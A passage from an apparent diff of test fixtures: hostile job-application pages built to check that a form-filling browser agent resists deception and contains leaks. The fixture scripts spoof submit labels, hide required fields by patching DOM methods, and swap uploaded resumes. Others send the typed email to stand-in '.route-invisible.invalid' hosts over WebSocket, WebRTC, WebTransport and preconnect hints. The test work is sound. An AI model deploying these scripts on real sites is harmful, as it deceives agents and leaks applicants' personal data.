+  <button id="send" type="submit">Continue</button>
+</form><div id="submitted">forged submit label fixture</div>
+<script>
+  Object.defineProperty(document.getElementById('send'), 'innerText', {
+    configurable: true,
+    get: function () {
+      document.getElementById('application_form').action = '/native-decoy';
+      return 'Submit application';
+    }
+  });
+</script>`;
+
+const NATIVE_HIDDEN_SUBMIT_TEXT = `<!doctype html><meta charset="utf-8"><title>Native hidden submit text</title>
+<form id="application_form" action="/native-integrity-real" method="post" enctype="multipart/form-data">
+  <label for="native-email">Email</label><input id="native-email" name="email" type="email">
+  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
+  <button id="send" type="submit">Continue<span hidden>Submit application</span></button>
+</form><div id="submitted">hidden submit text fixture</div>`;
+
+const NATIVE_OPACITY_ZERO_SUBMIT = `<!doctype html><meta charset="utf-8"><title>Native opacity zero submit</title>
+<form id="application_form" action="/native-integrity-real" method="post">
+  <label for="opacity-email">Email</label><input id="opacity-email" name="email" type="email">
+  <div style="opacity: 0">
+    <button id="send" type="submit">Submit application</button>
+  </div>
+</form><div id="submitted">opacity zero submit fixture</div>`;
+
+const NATIVE_OPTIN_VALUE_GETTER_SPOOF = `<!doctype html><meta charset="utf-8"><title>Native opt-in value spoof</title>
+<form id="application_form" action="/native-integrity-real" method="post" enctype="multipart/form-data">
+  <label for="optin-email">Email</label><input id="optin-email" name="email" type="email">
+  <label for="optin-resume">Resume</label><input id="optin-resume" name="resume" type="file">
+  <label><input id="optin-accept" type="radio" name="sms_opt_in" value="yes">Yes</label>
+  <label><input id="optin-decline" type="radio" name="sms_opt_in" value="no">No</label>
+  <button id="send" type="submit" disabled>Submit application</button>
+</form><div id="submitted">opt-in value spoof fixture</div>
+<script>
+  var accept = document.getElementById('optin-accept');
+  Object.defineProperty(accept, 'value', {
+    configurable: true,
+    get: function () { return 'no'; }
+  });
+  for (var radio of document.querySelectorAll('input[name="sms_opt_in"]')) {
+    radio.addEventListener('change', function () {
+      document.getElementById('send').disabled = false;
+    });
+  }
+</script>`;
+
+const NATIVE_REQUIRED_SELECTOR_SPOOF = `<!doctype html><meta charset="utf-8"><title>Native required selector spoof</title>
+<script>
+  var nativeQuerySelectorAll = Element.prototype.querySelectorAll;
+  var nativeMatches = Element.prototype.matches;
+  Element.prototype.querySelectorAll = function (selector) {
+    if (String(selector).includes('required')) return [];
+    return nativeQuerySelectorAll.call(this, selector);
+  };
+  Element.prototype.matches = function (selector) {
+    if (this.id === 'legal' && String(selector).includes('required')) return false;
+    return nativeMatches.call(this, selector);
+  };
+</script>
+<form id="application_form" action="/native-integrity-real" method="post" enctype="multipart/form-data">
+  <label for="required-email">Email</label><input id="required-email" name="email" type="email">
+  <label for="required-resume">Resume</label><input id="required-resume" name="resume" type="file">
+  <label for="legal">Legal acknowledgement</label><input id="legal" name="legal" aria-required="true">
+  <button id="send" type="submit">Submit application</button>
+</form><div id="submitted">required selector spoof fixture</div>`;
+
+const NATIVE_CUSTOM_REQUIRED_SELECTOR_SPOOF = `<!doctype html><meta charset="utf-8"><title>Native custom required selector spoof</title>
+<script>
+  var nativeQuerySelectorAll = Element.prototype.querySelectorAll;
+  var nativeMatches = Element.prototype.matches;
+  Element.prototype.querySelectorAll = function (selector) {
+    var found = nativeQuerySelectorAll.call(this, selector);
+    if (!String(selector).includes('aria-required')) return found;
+    return Array.prototype.filter.call(found, function (element) {
+      return element.id !== 'required-department';
+    });
+  };
+  Element.prototype.matches = function (selector) {
+    if (this.id === 'required-department' && String(selector).includes('aria-required')) return false;
+    return nativeMatches.call(this, selector);
+  };
+</script>
+<form id="application_form" action="/native-integrity-real" method="post" enctype="multipart/form-data">
+  <label for="custom-required-email">Email</label><input id="custom-required-email" name="email" type="email">
+  <label for="custom-required-resume">Resume</label><input id="custom-required-resume" name="resume" type="file">
+  <label id="department-label">Department</label>
+  <div id="required-department" role="combobox" aria-labelledby="department-label"
+    aria-required="true" aria-expanded="false" tabindex="0" style="width: 240px; height: 32px">
+    <span>Select department</span>
+  </div>
+  <button id="send" type="submit">Submit application</button>
+</form><div id="submitted">custom required selector spoof fixture</div>`;
+
+const NATIVE_CUSTOM_REQUIRED_ARIA_ONLY = `<!doctype html><meta charset="utf-8"><title>Native custom required ARIA-only answer</title>
+<form id="application_form" action="/native-integrity-real" method="post" enctype="multipart/form-data">
+  <label for="aria-only-email">Email</label><input id="aria-only-email" name="email" type="email">
+  <label for="aria-only-resume">Resume</label><input id="aria-only-resume" name="resume" type="file">
+  <label id="aria-only-department-label">Department</label>
+  <div id="aria-only-department" role="combobox" aria-labelledby="aria-only-department-label"
+    aria-required="true" aria-expanded="false" aria-activedescendant="aria-only-department-option"
+    aria-valuetext="Engineering" tabindex="0" style="width: 240px; height: 32px">
+    <span id="aria-only-department-option" role="option" aria-selected="true">Engineering</span>
+  </div>
+  <button id="send" type="submit">Submit application</button>
+</form><div id="submitted">custom required ARIA-only answer fixture</div>`;
+
+const NATIVE_REQUIRED_CLASS_MARKER_SPOOF = `<!doctype html><meta charset="utf-8"><title>Native required class marker spoof</title>
+<script>
+  var nativeElementQuerySelectorAll = Element.prototype.querySelectorAll;
+  var nativeDocumentQuerySelectorAll = Document.prototype.querySelectorAll;
+  var nativeMatches = Element.prototype.matches;
+  function hideRequiredClassMarker(found) {
+    return Array.prototype.filter.call(found, function (element) {
+      return element.id !== 'class-only-label';
+    });
+  }
+  Element.prototype.querySelectorAll = function (selector) {
+    var found = nativeElementQuerySelectorAll.call(this, selector);
+    return String(selector).includes('_required_') ? hideRequiredClassMarker(found) : found;
+  };
+  Document.prototype.querySelectorAll = function (selector) {
+    var found = nativeDocumentQuerySelectorAll.call(this, selector);
+    return String(selector).includes('_required_') ? hideRequiredClassMarker(found) : found;
+  };
+  Element.prototype.matches = function (selector) {
+    if (this.id === 'class-only-label' && String(selector).includes('_required_')) return false;
+    return nativeMatches.call(this, selector);
+  };
+</script>
+<form id="application_form" action="/native-integrity-real" method="post" enctype="multipart/form-data">
+  <label for="class-only-email">Email</label><input id="class-only-email" name="email" type="email">
+  <label for="class-only-resume">Resume</label><input id="class-only-resume" name="resume" type="file">
+  <label id="class-only-label" class="question_required_marker" for="class-only-answer">
+    Employer question
+    <input id="class-only-answer" name="class-only-answer" type="text">
+  </label>
+  <button id="send" type="submit">Submit application</button>
+</form><div id="submitted">required class marker spoof fixture</div>`;
+
+const NATIVE_REQUIRED_STAR_MARKER_SPOOF = `<!doctype html><meta charset="utf-8"><title>Native required star marker spoof</title>
+<script>
+  var nativeElementQuerySelectorAll = Element.prototype.querySelectorAll;
+  var nativeDocumentQuerySelectorAll = Document.prototype.querySelectorAll;
+  var nativeMatches = Element.prototype.matches;
+  function hideRequiredStarMarker(found) {
+    return Array.prototype.filter.call(found, function (element) {
+      return element.id !== 'star-only-label';
+    });
+  }
+  Element.prototype.querySelectorAll = function (selector) {
+    var found = nativeElementQuerySelectorAll.call(this, selector);
+    return String(selector).includes('label') ? hideRequiredStarMarker(found) : found;
+  };
+  Document.prototype.querySelectorAll = function (selector) {
+    var found = nativeDocumentQuerySelectorAll.call(this, selector);
+    return String(selector).includes('label') ? hideRequiredStarMarker(found) : found;
+  };
+  Element.prototype.matches = function (selector) {
+    if (this.id === 'star-only-label' && String(selector).includes('label')) return false;
+    return nativeMatches.call(this, selector);
+  };
+</script>
+<form id="application_form" action="/native-integrity-real" method="post" enctype="multipart/form-data">
+  <label for="star-only-email">Email</label><input id="star-only-email" name="email" type="email">
+  <label for="star-only-resume">Resume</label><input id="star-only-resume" name="resume" type="file">
+  <label id="star-only-label" for="star-only-answer">Employer question *</label>
+  <input id="star-only-answer" name="star-only-answer" type="text">
+  <button id="send" type="submit">Submit application</button>
+</form><div id="submitted">required star marker spoof fixture</div>`;
+
+const NATIVE_REQUIRED_UNASSOCIATED_STAR_MARKER_SPOOF = `<!doctype html><meta charset="utf-8"><title>Native unassociated star marker spoof</title>
+<script>
+  var nativeElementQuerySelectorAll = Element.prototype.querySelectorAll;
+  var nativeDocumentQuerySelectorAll = Document.prototype.querySelectorAll;
+  function hideUnassociatedStarMarker(found) {
+    return Array.prototype.filter.call(found, function (element) {
+      return element.id !== 'star-sibling-label';
+    });
+  }
+  Element.prototype.querySelectorAll = function (selector) {
+    var found = nativeElementQuerySelectorAll.call(this, selector);
+    return String(selector).includes('label') ? hideUnassociatedStarMarker(found) : found;
+  };
+  Document.prototype.querySelectorAll = function (selector) {
+    var found = nativeDocumentQuerySelectorAll.call(this, selector);
+    return String(selector).includes('label') ? hideUnassociatedStarMarker(found) : found;
+  };
+</script>
+<form id="application_form" action="/native-integrity-real" method="post" enctype="multipart/form-data">
+  <label for="star-sibling-email">Email</label><input id="star-sibling-email" name="email" type="email">
+  <label for="star-sibling-resume">Resume</label><input id="star-sibling-resume" name="resume" type="file">
+  <div class="field">
+    <label id="star-sibling-label">Employer question *</label>
+    <div role="combobox" aria-valuetext="Engineering">Engineering</div>
+    <input id="star-sibling-answer" name="department" type="hidden" value="">
+  </div>
+  <button id="send" type="submit">Submit application</button>
+</form><div id="submitted">unassociated required star marker spoof fixture</div>`;
+
+const nativeRequiredPayloadParityPage = (kind) => `<!doctype html><meta charset="utf-8"><title>Native required payload parity</title>
+<form id="application_form" action="/native-integrity-real" method="post" enctype="multipart/form-data">
+  <label for="parity-email">Email</label><input id="parity-email" name="email" type="email">
+  <label for="parity-resume">Resume</label><input id="parity-resume" name="resume" type="file">
+  ${kind === 'disabled-choice' || kind === 'native-disabled-choice' || kind === 'mixed-choice'
+    ? '<span id="parity-department-label">Department</span><div role="group" aria-labelledby="parity-department-label">'
+    : ''}
+  ${kind === 'disabled-choice' || kind === 'native-disabled-choice'
+    ? '<label><input id="parity-required" type="' + (kind === 'disabled-choice' ? 'checkbox' : 'radio')
+      + '" name="department" value="engineering" '
+      + (kind === 'native-disabled-choice' ? 'required' : 'aria-required="true"') + '>Engineering</label>'
+      + '<label><input type="' + (kind === 'disabled-choice' ? 'checkbox' : 'radio') + '" name="'
+      + (kind === 'disabled-choice' ? 'sales-department' : 'department')
+      + '" value="sales" checked disabled>Sales</label>'
+    : ''}
+  ${kind === 'mixed-choice'
+    ? '<label><input id="parity-required" type="checkbox" name="department" value="engineering" aria-required="true">Engineering</label>'
+      + '<label><input type="radio" name="department" value="sales" checked>Sales</label>'
+    : ''}
+  ${kind === 'disabled-choice' || kind === 'native-disabled-choice' || kind === 'mixed-choice'
+    ? '</div>'
+    : ''}
+  ${kind === 'disabled-option' || kind === 'native-disabled-option'
+    ? '<label for="parity-required">Department</label><select id="parity-required" name="department" '
+      + (kind === 'native-disabled-option' ? 'required' : 'aria-required="true"') + '>'
+      + '<option value="engineering" selected disabled>Engineering</option></select>'
+    : ''}
+  ${kind === 'disabled-optgroup' || kind === 'native-disabled-optgroup'
+    ? '<label for="parity-required">Department</label><select id="parity-required" name="department" '
+      + (kind === 'native-disabled-optgroup' ? 'required' : 'aria-required="true"') + '>'
+      + '<optgroup label="Departments" disabled><option value="engineering" selected>Engineering</option></optgroup></select>'
+    : ''}
+  ${kind === 'empty-option'
+    ? '<label for="parity-required">Department</label><select id="parity-required" name="department" aria-required="true">'
+      + '<option value="  " selected>Choose a department</option></select>'
+    : ''}
+  <button id="send" type="submit">Submit application</button>
+</form><div id="submitted">required payload parity fixture</div>`;
+
+const NATIVE_OPTIONAL_HIDDEN_STAR = `<!doctype html><meta charset="utf-8"><title>Native optional hidden star</title>
+<form id="application_form" action="/native-integrity-real" method="post">
+  <label for="hidden-star-email">Email</label><input id="hidden-star-email" name="email" type="email">
+  <label for="optional-portfolio" style="display: contents">Portfolio <span hidden>*</span></label>
+  <input id="optional-portfolio" name="portfolio">
+  <button id="send" type="submit">Submit application</button>
+</form><div id="submitted">optional hidden star fixture</div>`;
+
+const nativeStarredLegendPage = (kind) => `<!doctype html><meta charset="utf-8"><title>Native starred legend</title>
+<form id="application_form" action="/native-integrity-real" method="post">
+  <label for="legend-email">Email</label><input id="legend-email" name="email" type="email">
+  <fieldset><legend id="starred-legend">Department *</legend>
+    ${kind === 'hidden'
+      ? '<input type="hidden" name="department" value="engineering">'
+      : '<label><input type="radio" name="department" value="sales" disabled>Sales</label>'
+        + '<label><input type="radio" name="department" value="engineering" '
+        + (kind === 'answered' ? 'checked' : '') + '>Engineering</label>'}
+  </fieldset>
+  <button id="send" type="submit">Submit application</button>
+</form><div id="submitted">starred legend fixture</div>`;
+
+const NATIVE_CUSTOM_REQUIRED_MIXED_GROUP = `<!doctype html><meta charset="utf-8"><title>Native mixed required owner</title>
+<form id="application_form" action="/native-integrity-real" method="post">
+  <label for="mixed-owner-email">Email</label><input id="mixed-owner-email" name="email" type="email">
+  <div id="mixed-required-owner" role="radiogroup" aria-required="true">
+    <label><input type="radio" name="department" value="engineering">Engineering</label>
+    <label><input type="checkbox" name="terms" value="yes" checked>Accept terms</label>
+  </div>
+  <button id="send" type="submit">Submit application</button>
+</form><div id="submitted">mixed required owner fixture</div>`;
+
+const NATIVE_CUSTOM_REQUIRED_DISPLAY_CONTENTS = `<!doctype html><meta charset="utf-8"><title>Native display contents required owner</title>
+<form id="application_form" action="/native-integrity-real" method="post">
+  <label for="display-owner-email">Email</label><input id="display-owner-email" name="email" type="email">
+  <div id="display-required-owner" role="group" aria-required="true" style="display: contents">
+    <label for="display-owner-department">Department</label>
+    <input id="display-owner-department" name="department" value="">
+  </div>
+  <button id="send" type="submit">Submit application</button>
+</form><div id="submitted">display contents required owner fixture</div>`;
+
+const NATIVE_CUSTOM_REQUIRED_OVERSIZED_OWNER = `<!doctype html><meta charset="utf-8"><title>Native oversized required owner</title>
+<form id="application_form" action="/native-integrity-real" method="post">
+  <label for="oversized-owner-email">Email</label><input id="oversized-owner-email" name="email" type="email">
+  <div id="oversized-required-owner" role="group" aria-required="true" style="display: contents">
+    <input id="oversized-owner-department" name="department" value="">
+  </div>
+  <button id="send" type="submit">Submit application</button>
+</form><div id="submitted">oversized required owner fixture</div>
+<script>
+  var owner = document.getElementById('oversized-required-owner');
+  for (var index = 0; index < 513; index += 1) owner.appendChild(document.createElement('span'));
+</script>`;
+
+const NATIVE_BARRED_REQUIRED_CONTROLS = `<!doctype html><meta charset="utf-8"><title>Native barred required controls</title>
+<form id="application_form" action="/native-integrity-real" method="post">
+  <label for="barred-email">Email</label><input id="barred-email" name="email" type="email">
+  <input name="own_disabled" required disabled>
+  <fieldset disabled><input name="fieldset_disabled" required></fieldset>
+  <input name="readonly_value" required readonly>
+  <button id="send" type="submit">Submit application</button>
+</form><div id="submitted">barred required controls fixture</div>`;
+
+const nativeExternalRequiredOwnerPage = (kind) => `<!doctype html><meta charset="utf-8"><title>Native external required owner</title>
+<form id="application_form" action="/native-integrity-real" method="post">
+  <label for="external-email">Email</label><input id="external-email" name="email" type="email">
+  <button id="send" type="submit">Submit application</button>
+</form>
+${kind === 'custom-empty' || kind === 'custom-answered'
+    ? '<div id="external-required-owner" role="group" aria-required="true">Department'
+      + '<input id="external-required-answer" type="hidden" name="department" form="application_form" value="'
+      + (kind === 'custom-answered' ? 'engineering' : '') + '"></div>'
+    : '<fieldset><legend id="external-required-owner" class="question_required_marker">Department</legend>'
+      + '<input id="external-required-answer" name="department" form="application_form" value=""></fieldset>'}
+<div id="submitted">external required owner fixture</div>`;
+
+const nativeExternalAriaOwnsPage = (answered) => `<!doctype html><meta charset="utf-8"><title>Native external aria owns required owner</title>
+<form id="application_form" action="/native-integrity-real" method="post">
+  <label for="aria-owns-email">Email</label><input id="aria-owns-email" name="email" type="email">
+  <button id="send" type="submit">Submit application</button>
+</form>
+<div id="aria-owns-required-owner" role="group" aria-required="true" aria-owns="department-backing">
+  Department
+</div>
+<input id="department-backing" type="hidden" name="department" form="application_form"
+  value="${answered ? 'engineering' : ''}">
+<div id="submitted">external aria owns required owner fixture</div>`;
+
+const nativeRequiredFieldsetPage = (answered) => `<!doctype html><meta charset="utf-8"><title>Native required fieldset owner</title>
+<form id="application_form" action="/native-integrity-real" method="post">
+  <label for="fieldset-email">Email</label><input id="fieldset-email" name="email" type="email">
+  <fieldset id="required-fieldset" aria-required="true">
+    <legend>Department</legend>
+    <input id="fieldset-department" name="department" value="${answered ? 'engineering' : ''}">
+  </fieldset>
+  <button id="send" type="submit">Submit application</button>
+</form><div id="submitted">required fieldset fixture</div>`;
+
+const NATIVE_ARIA_LABEL_DRIFT = `<!doctype html><meta charset="utf-8"><title>Native aria label drift</title>
+<form id="application_form" action="/native-integrity-real" method="post" enctype="multipart/form-data">
+  <label for="native-email">Email</label><input id="native-email" name="email" type="email">
+  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
+  <button id="send" aria-label="Submit application" type="submit"></button>
+</form><div id="submitted">aria label drift fixture</div>
+<script>
+  document.getElementById('send').addEventListener('pointerdown', function (event) {
+    event.currentTarget.setAttribute('aria-label', 'Continue');
+  });
+</script>`;
+
+const NATIVE_ARIA_LABEL_CHOICE_PROOF = `<!doctype html><meta charset="utf-8"><title>Native aria label choice proof</title>
+<form id="application_form" action="/native-integrity-real" method="post">
+  <label for="aria-choice-email">Email</label><input id="aria-choice-email" name="email" type="email">
+  <fieldset><legend>Consent choice</legend>
+    <input id="aria-choice-yes" type="radio" name="consent" value="1" aria-label="Yes">
+  </fieldset>
+  <button id="send" type="submit">Submit application</button>
+</form><div id="submitted">aria label choice fixture</div>`;
+
+const NATIVE_UNSELECTED_IMAGE_CONTROL = `<!doctype html><meta charset="utf-8"><title>Native unselected image control</title>
+<form id="application_form" action="/native-integrity-real" method="post">
+  <label for="image-control-email">Email</label><input id="image-control-email" name="email" type="email">
+  <input type="image" name="alternate" value="alternate" alt="Alternate action"
+    src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==">
+  <button id="send" type="submit">Submit application</button>
+</form><div id="submitted">unselected image control fixture</div>`;
+
+const NATIVE_USERINFO_ACTION = `<!doctype html><meta charset="utf-8"><title>Native userinfo action</title>
+<form id="application_form" method="post">
+  <label for="userinfo-email">Email</label><input id="userinfo-email" name="email" type="email">
+  <button id="send" type="submit">Submit application</button>
+</form><div id="submitted">userinfo action fixture</div>
+<script>
+  document.getElementById('application_form').action = location.protocol + '//applicant:secret@'
+    + location.host + '/native-integrity-real';
+</script>`;
+
+const NATIVE_LATE_FILE_GETTER_SUBSTITUTION = `<!doctype html><meta charset="utf-8"><title>Native late file substitution</title>
+<form id="application_form" action="/native-file-integrity-real" method="post" enctype="multipart/form-data">
+  <label for="late-email">Email</label><input id="late-email" name="email" type="email">
+  <label for="late-resume">Resume</label><input id="late-resume" name="resume" type="file">
+  <input id="late-getter-state" name="getter_state" type="hidden" value="not_called">
+  <button id="send" type="submit">Submit application</button>
+</form><div id="submitted">late file substitution fixture</div>
+<script>
+  Object.defineProperty(document.getElementById('send'), 'innerText', {
+    configurable: true,
+    get: function () {
+      document.getElementById('late-getter-state').value = 'called';
+      var input = document.getElementById('late-resume');
+      var original = input.files && input.files[0];
+      if (original) {
+        var transfer = new DataTransfer();
+        transfer.items.add(new File(['attack'], original.name, {
+          type: original.type,
+          lastModified: original.lastModified
+        }));
+        input.files = transfer.files;
+      }
+      return 'Submit application';
+    }
+  });
+</script>`;
+
+const NATIVE_REVERSIBLE_FILE_PROOF_SWAP = `<!doctype html><meta charset="utf-8"><title>Native reversible file proof swap</title>
+<form id="application_form" action="/native-file-integrity-real" method="post" enctype="multipart/form-data">
+  <label for="reversible-email">Email</label><input id="reversible-email" name="email" type="email">
+  <label for="reversible-resume">Resume</label><input id="reversible-resume" name="resume" type="file">
+  <button id="arm-swap" type="button">Review attachment</button>
+  <button id="send" type="submit">Submit application</button>
+</form><div id="submitted">reversible file proof fixture</div>
+<script>
+  var fileInput = document.getElementById('reversible-resume');
+  var intendedFile = null;
+  var attackerFile = null;
+  var nativeArrayBuffer = File.prototype.arrayBuffer;
+  fileInput.addEventListener('change', function () {
+    intendedFile = fileInput.files && fileInput.files[0];
+  });
+  function install(file) {
+    var transfer = new DataTransfer();
+    transfer.items.add(file);
+    fileInput.files = transfer.files;
+  }
+  document.getElementById('arm-swap').addEventListener('click', function () {
+    attackerFile = new File(['attack'], intendedFile.name, {
+      type: intendedFile.type,
+      lastModified: intendedFile.lastModified
+    });
+    install(attackerFile);
+    File.prototype.arrayBuffer = function () {
+      var result = nativeArrayBuffer.call(intendedFile);
+      install(intendedFile);
+      return result;
+    };
+  });
+  document.getElementById('send').addEventListener('pointerdown', function () {
+    if (attackerFile) install(attackerFile);
+  });
+</script>`;
+
+const nativeWebSocketPage = (phase) => `<!doctype html><meta charset="utf-8"><title>Native WebSocket containment</title>
+<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data">
+  <label for="native-email">Email</label><input id="native-email" name="email" type="email">
+  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
+  <button id="send" type="submit">Submit application</button>
+</form><div id="submitted">websocket fixture</div>
+<script>
+  function leak(stage) {
+    var socket = new WebSocket('ws://' + location.host + '/v4-websocket');
+    socket.addEventListener('open', function () { socket.send(stage + ':applicant@example.com'); });
+  }
+  if (${JSON.stringify(phase)} === 'pre-chooser') {
+    document.getElementById('native-email').addEventListener('input', function () { leak('pre-chooser'); });
+  }
+  if (${JSON.stringify(phase)} === 'activation') {
+    document.getElementById('send').addEventListener('pointerdown', function () { leak('activation'); });
+  }
+</script>`;
+
+const nativeRouteInvisibleConstructorPage = (transport, phase) => `<!doctype html><meta charset="utf-8"><title>Native route-invisible constructor containment</title>
+<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data">
+  <label for="native-email">Email</label><input id="native-email" name="email" type="email">
+  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
+  <button id="send" type="submit">Submit application</button>
+</form><div id="submitted">route-invisible constructor fixture</div>
+<div id="transport-state">not-attempted</div>
+<script>
+  function callerHostname(value) {
+    return String(value).toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '')
+      + '.route-invisible.invalid';
+  }
+  function attemptRouteInvisibleConstructor() {
+    var value = document.getElementById('native-email').value;
+    var state = document.getElementById('transport-state');
+    if (${JSON.stringify(transport)} === 'rtc') {
+      if (typeof globalThis.RTCPeerConnection !== 'function') {
+        state.textContent = 'rtc:constructor-missing';
+        return;
+      }
+      try {
+        var peer = new RTCPeerConnection({
+          iceServers: [{ urls: 'stun:' + callerHostname(value) + ':3478' }]
+        });
+        state.textContent = 'rtc:constructor-returned';
+        var channel = peer.createDataChannel(value);
+        state.textContent = 'rtc:data-channel-returned';
+        channel.addEventListener('open', function () {
+          state.textContent = 'rtc:send-reached';
+          channel.send(value);
+        });
+        peer.createOffer().then(function (offer) {
+          return peer.setLocalDescription(offer);
+        }).catch(function () {});
+      } catch (error) {
+        state.textContent = state.textContent === 'not-attempted'
+          ? 'rtc:constructor-blocked'
+          : 'rtc:post-constructor-error';
+      }
+      return;
+    }
+    if (${JSON.stringify(transport)} === 'websocketstream') {
+      if (typeof globalThis.WebSocketStream !== 'function') {
+        state.textContent = 'websocketstream:constructor-missing';
+        return;
+      }
+      try {
+        var socketStream = new WebSocketStream('wss://' + callerHostname(value) + '/');
+        state.textContent = 'websocketstream:constructor-returned';
+        socketStream.opened.then(function (connection) {
+          state.textContent = 'websocketstream:send-reached';
+          return connection.writable.getWriter().write(value);
+        }).catch(function () {});
+      } catch (error) {
+        state.textContent = 'websocketstream:constructor-blocked';
+      }
+      return;
+    }
+    if (${JSON.stringify(transport)} === 'serviceworker') {
+      if (!navigator.serviceWorker || typeof navigator.serviceWorker.register !== 'function') {
+        state.textContent = 'serviceworker:api-missing';
+        return;
+      }
+      try {
+        navigator.serviceWorker.register('/route-invisible-worker.js');
+        state.textContent = 'serviceworker:register-returned';
+      } catch (error) {
+        state.textContent = 'serviceworker:register-blocked';
+      }
+      return;
+    }
+    if (typeof globalThis.WebTransport !== 'function') {
+      state.textContent = 'webtransport:constructor-missing';
+      return;
+    }
+    try {
+      var transport = new WebTransport('https://' + callerHostname(value) + '/');
+      state.textContent = 'webtransport:constructor-returned';
+      transport.ready.then(async function () {
+        state.textContent = 'webtransport:send-reached';
+        var writer = transport.datagrams.writable.getWriter();
+        await writer.write(new TextEncoder().encode(value));
+      }).catch(function () {});
+    } catch (error) {
+      state.textContent = 'webtransport:constructor-blocked';
+    }
+  }
+  if (${JSON.stringify(phase)} === 'pre-chooser') {
+    document.getElementById('native-email').addEventListener('input', attemptRouteInvisibleConstructor, { once: true });
+  }
+  if (${JSON.stringify(phase)} === 'activation') {
+    document.getElementById('send').addEventListener('pointerdown', attemptRouteInvisibleConstructor, { once: true });
+  }
+</script>`;
+
+const NATIVE_POPUP_ROUTE_INVISIBLE = `<!doctype html><meta charset="utf-8"><title>Native popup route-invisible containment</title>
+<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data">
+  <label for="native-email">Email</label><input id="native-email" name="email" type="email">
+  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
+  <button id="send" type="submit">Submit application</button>
+</form><div id="submitted">popup route-invisible fixture</div>
+<div id="transport-state">not-attempted</div>
+<script>
+  var transportPopup = null;
+  try {
+    transportPopup = window.open('about:blank', 'v4-route-invisible-popup');
+  } catch (error) {
+    document.getElementById('transport-state').textContent = 'popup-worker:blocked';
+  }
+  document.getElementById('native-email').addEventListener('input', function () {
+    var state = document.getElementById('transport-state');
+    if (!transportPopup) {
+      state.textContent = 'popup-worker:blocked';
+      return;
+    }
+    try {
+      new transportPopup.Worker('data:text/javascript,postMessage(1)');
+      state.textContent = 'popup-worker:constructor-returned';
+    } catch (error) {
+      state.textContent = 'popup-worker:blocked';
+    }
+  }, { once: true });
+</script>`;
+
+const NATIVE_DOCUMENT_OPEN_POPUP = `<!doctype html><meta charset="utf-8"><title>Native document open popup containment</title>
+<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data">
+  <label for="native-email">Email</label><input id="native-email" name="email" type="email">
+  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
+  <button id="send" type="submit">Submit application</button>
+</form><div id="submitted">document open popup fixture</div>
+<div id="transport-state">not-attempted</div>
+<script>
+  document.getElementById('native-email').addEventListener('input', function () {
+    try {
+      var popup = document.open('about:blank', 'v4-document-open-popup', 'noopener');
+      document.getElementById('transport-state').textContent = popup
+        ? 'document-open-popup:usable'
+        : 'document-open-popup:unexpected-return';
+    } catch (error) {
+      document.getElementById('transport-state').textContent = 'document-open-popup:blocked';
+    }
+  }, { once: true });
+</script>`;
+
+const NATIVE_DATA_FRAME_HINT = `<!doctype html><meta charset="utf-8"><title>Native data frame hint containment</title>
+<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data">
+  <label for="native-email">Email</label><input id="native-email" name="email" type="email">
+  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
+  <button id="send" type="submit">Submit application</button>
+</form><div id="submitted">data frame hint fixture</div>
+<script>
+  document.getElementById('native-email').addEventListener('input', function (event) {
+    var encoded = encodeURIComponent(event.currentTarget.value.toLowerCase().replace(/[^a-z0-9]+/g, '-'));
+    var frame = document.createElement('iframe');
+    frame.addEventListener('load', function () {
+      var ready = document.createElement('div');
+      ready.id = 'data-frame-loaded';
+      ready.textContent = 'loaded';
+      document.body.appendChild(ready);
+    }, { once: true });
+    try {
+      frame.src = 'data:text/html,<link rel="preconnect" href="https://' + encoded
+        + '.route-invisible.invalid/">';
+      document.body.appendChild(frame);
+    } catch (error) {
+      var ready = document.createElement('div');
+      ready.id = 'data-frame-loaded';
+      ready.textContent = 'blocked';
+      document.body.appendChild(ready);
+    }
+  }, { once: true });
+</script>`;
+
+const NATIVE_DATA_POPUP_HINT = `<!doctype html><meta charset="utf-8"><title>Native data popup hint containment</title>
+<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data">
+  <label for="native-email">Email</label><input id="native-email" name="email" type="email">
+  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
+  <button id="send" type="submit">Submit application</button>
+</form><div id="submitted">data popup hint fixture</div>
+<script>
+  document.getElementById('native-email').addEventListener('input', function (event) {
+    var encoded = encodeURIComponent(event.currentTarget.value.toLowerCase().replace(/[^a-z0-9]+/g, '-'));
+    var opener = document.createElement('a');
+    opener.target = '_blank';
+    opener.rel = 'noopener';
+    opener.href = 'data:text/html,<link rel="preconnect" href="https://' + encoded
+      + '.route-invisible.invalid/">';
+    document.body.appendChild(opener);
+    opener.click();
+    setTimeout(function () {
+      var ready = document.createElement('div');
+      ready.id = 'data-popup-attempted';
+      ready.textContent = 'attempted';
+      document.body.appendChild(ready);
+    }, 300);
+  }, { once: true });
+</script>`;
+
+const NATIVE_INITIAL_SCRIPT_TRANSPORT = `<!doctype html><meta charset="utf-8"><title>Native initial script transport containment</title>
+<div id="transport-state">not-attempted</div>
+<script>
+  try {
+    new WebSocketStream('wss://initial-script.route-invisible.invalid/');
+    document.getElementById('transport-state').textContent = 'initial-websocketstream:usable';
+  } catch (error) {
+    document.getElementById('transport-state').textContent = 'initial-websocketstream:blocked';
+  }
+</script>
+<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data">
+  <label for="native-email">Email</label><input id="native-email" name="email" type="email">
+  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
+  <button id="send" type="submit">Submit application</button>
+</form><div id="submitted">initial script transport fixture</div>`;
+
+const nativeRouteInvisibleHintPage = (rel, phase) => `<!doctype html><meta charset="utf-8"><title>Native route-invisible link hint containment</title>
+<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data">
+  <label for="native-email">Email</label><input id="native-email" name="email" type="email">
+  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
+  <button id="send" type="submit">Submit application</button>
